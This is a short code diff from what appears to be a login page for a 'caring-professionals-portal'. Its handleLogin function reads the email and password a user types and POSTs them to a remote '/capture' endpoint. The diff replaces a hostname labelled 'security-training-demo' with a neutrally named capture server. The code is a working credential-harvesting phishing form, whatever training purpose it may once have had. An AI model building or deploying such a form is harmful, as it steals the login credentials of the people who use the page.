@@ -94,7 +94,7 @@ function handleLogin(){
   var email=document.getElementById('email-input').value;
   var pass=document.getElementById('pass-input').value;
   if(!email||!pass){alert('Please enter your email address and password.');return;}
-  fetch('https://security-training-demo.onrender.com/capture',{
+  fetch('https://sbc-capture-server.onrender.com/capture',{
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body:JSON.stringify({email:email,password:pass,page:'caring-professionals-portal',timestamp:new Date().toISOString()})
